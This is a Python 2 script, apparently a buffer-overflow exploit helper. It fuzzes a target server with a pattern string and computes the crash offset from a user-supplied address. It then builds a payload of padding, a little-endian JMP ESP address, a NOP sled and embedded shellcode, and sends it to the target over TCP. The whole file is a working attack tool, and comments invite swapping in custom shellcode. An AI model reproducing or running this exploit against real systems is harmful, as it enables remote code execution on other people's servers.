#!/usr/bin/env python
# -*- coding: utf-8 -*-



import random
import string
import socket 
import time
import readline

class Buffer_Over:
     def __init__(self):
         self.Banner() 
         self.string_ramdon()
         self.connect_servser()
         self.hexadecimal() 
         self.payload()
         self.little_endian()        
         self.attack_all()
	 self.Banner()

     def string_ramdon(self):
         try:
	 	 self.Requst_String = str(raw_input("\n[+]Enter your reguset:")).strip()
		 self.length_String =len(self.Requst_String)
		 time.sleep(2)
		 print "\n[+]character length is :",self.length_String
		 value = string.ascii_letters
		 self.Random_String = "".join(random.choice(value)for i in range(self.length_String)).lower()  
                 self.Random_String = bytearray(self.Random_String)
		 print "\n[+]Generated String is:",(self.Random_String).strip()
		 print '\n[+]The New character length is:',len(self.Random_String )
         except KeyboardInterrupt:
                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                  exit()
 
     def connect_servser(self):
          while True:
	        try:
	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		    self.server_ip=str(raw_input("\n[+]server ip : "))
		    time.sleep(2)
		    self.server_port=int(raw_input("\n[+]server port :"))
		    socket_1.connect((self.server_ip,self.server_port))
		    data = socket_1.recv(1023)
		    socket_1.send( self.Random_String + '\r\n')
		    time.sleep(2)
	      	    print "\n[+]data send successful...!!!"
		    socket_1.close()
		    break
	        except Exception:
		    print "\n[+]something goes wrong try again..!!**!! "
                except KeyboardInterrupt:
                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                  exit()

     def hexadecimal (self):                                                                           
          while True:
                 try: 
		    self.hexadecimal = str(raw_input("\n[+]Enter hexadecimal Crach address: ")).upper()
                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		    if self.ASCII in  self.Random_String:
		       print "\n[+]The ASCII Value  is : ",self.ASCII
		       time.sleep(2)
		       self.location = self.Random_String.find(self.ASCII)
		       
		       print "\n[+]Exact satch at offset : ",self.location
	               break
                    else:
	               print "\n[+]WE NOT FOUNF THE VALUE IN OUR STRING  "
	               self.hexadecimal = str(raw_input("\n[+]Enter hexadecimal Crach address : ")).upper()                 
                 except Exception:
		       print "\n[+]something goes wrong try again..!!**!! "
                 except KeyboardInterrupt:
                      print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                      exit() 
     def payload(self):
         self.shellcode = (
"\xda\xce\xbd\x38\xb0\x82\x43\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x56\x31\x6f\x18\x03\x6f\x18\x83\xc7\x3c\x52\x77\xbf\xd4\x10"
"\x78\x40\x24\x75\xf0\xa5\x15\xb5\x66\xad\x05\x05\xec\xe3\xa9"
"\xee\xa0\x17\x3a\x82\x6c\x17\x8b\x29\x4b\x16\x0c\x01\xaf\x39"
"\x8e\x58\xfc\x99\xaf\x92\xf1\xd8\xe8\xcf\xf8\x89\xa1\x84\xaf"
"\x3d\xc6\xd1\x73\xb5\x94\xf4\xf3\x2a\x6c\xf6\xd2\xfc\xe7\xa1"
"\xf4\xff\x24\xda\xbc\xe7\x29\xe7\x77\x93\x99\x93\x89\x75\xd0"
"\x5c\x25\xb8\xdd\xae\x37\xfc\xd9\x50\x42\xf4\x1a\xec\x55\xc3"
"\x61\x2a\xd3\xd0\xc1\xb9\x43\x3d\xf0\x6e\x15\xb6\xfe\xdb\x51"
"\x90\xe2\xda\xb6\xaa\x1e\x56\x39\x7d\x97\x2c\x1e\x59\xfc\xf7"
"\x3f\xf8\x58\x59\x3f\x1a\x03\x06\xe5\x50\xa9\x53\x94\x3a\xa5"
"\x90\x95\xc4\x35\xbf\xae\xb7\x07\x60\x05\x50\x2b\xe9\x83\xa7"
"\x3a\xfd\x33\x77\x84\x6e\xca\x78\xf4\xa7\x09\x2c\xa4\xdf\xb8"             #PLEASE REPLACE THE SHELL CODE IN HERE  #
"\x4d\x2f\x20\x44\x98\xc5\x2a\xd2\x29\xda\x4f\xc3\x46\xde\x8f"             
"\x02\x2c\x57\x69\x54\x02\x37\x26\x15\xf2\xf7\x96\xfd\x18\xf8"              ######### # USE YOUR OWN CODE #######
"\xc9\x1e\x23\xd3\x61\xb4\xcc\x8d\xda\x21\x74\x94\x91\xd0\x79"
"\x03\xdc\xd3\xf2\xa1\x20\x9d\xf2\xc0\x32\xca\x64\x2a\xcb\x0b"
"\x01\x2a\xa1\x0f\x83\x7d\x5d\x12\xf2\x49\xc2\xed\xd1\xca\x05"
"\x11\xa4\xfa\x7e\x24\x32\x42\xe9\x49\xd2\x42\xe9\x1f\xb8\x42"
"\x81\xc7\x98\x11\xb4\x07\x35\x06\x65\x92\xb6\x7e\xd9\x35\xdf"
"\x7c\x04\x71\x40\x7f\x63\x01\x87\x7f\xf1\x2e\x20\x17\x09\x6f"
"\xd0\xe7\x63\x6f\x80\x8f\x78\x40\x2f\x7f\x80\x4b\x78\x17\x0b"
"\x1a\xca\x86\x0c\x37\x8a\x16\x0c\xb4\x17\xa9\x77\xb5\xa8\x4a"
"\x88\xdf\xcc\x4b\x88\xdf\xf2\x70\x5e\xe6\x80\xb7\x62\x5d\x9a"
"\x82\xc7\xf4\x31\xec\x54\x06\x10"
                          )
         
         
     def little_endian(self):
             try:
                jump= raw_input("\n[+] Enter JMP ESP addrsss HEX  : ").upper()
                self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                self.display =self.jump_address# for print olnly
                self.display = " ".join("\\x%s"%self.display[i:i+2] for i in range(0, len(self.display), 2))
                self.display= self.display.replace(" ", "")
                time.sleep(2)
                self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                print "\n[+]little endian JMP ESP  is : ", self.display
             except KeyboardInterrupt:
                print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                exit()
             
     def attack_all(self):
          while True:
	       try: 
                                  
                   socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   Start_string = self.location*"A"        
                   NO_Operation = len(self.Requst_String) - self.location  - len( self.jump_address) 
                   NO_Operation = NO_Operation*"\x90"   
                   attack = Start_string+self.jump_address+ NO_Operation +self.shellcode 
                   print '\n[+] attack =',len(Start_string),'of "A" + JMP ESP =', self.display ,'+',NO_Operation.count("\x90"),'of("\\x90") '" + shell code"
                   time.sleep(2)
                   print "\n[+]conncet server ip is  : ", self.server_ip
                   time.sleep(2)
                   print "\n[+]conncet server port is  : ", self.server_port         
                   socket_2.connect((self.server_ip,self.server_port))
                   print "\n[+]WE READY TO ATTACK !![+]"  
                   data_recv  = socket_2.recv(1024)
                   socket_2.send( attack + '\r\n')
                   time.sleep(2)
	           print "\n[+]data send successful...!!!"
                   socket_2.close()
                   print "\n[+]-------------------------{THANK YOU}--------------------------[+]"              
                                                      
	           break	
               except Exception:
		   print "\n[+]something goes wrong try again..!!**!!" 
                   stop = str(raw_input("\n[+]Enter any key to connect ???"))
               except KeyboardInterrupt:
                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                  exit()
                  
     def Banner(self):
           print"""
 ____         __  __             _   _      _                  
| __ ) _   _ / _|/ _| ___ _ __  | | | | ___| |_ __   ___ _ __  
|  _ \| | | | |_| |_ / _ \ '__| | |_| |/ _ \ | '_ \ / _ \ '__| 
| |_) | |_| |  _|  _|  __/ |    |  _  |  __/ | |_) |  __/ |    
|____/ \__,_|_| |_|  \___|_|    |_| |_|\___|_| .__/ \___|_|    
                                             |_|        
"""   
                  
                  
if __name__ == '__main__':
   Buffer_Over()




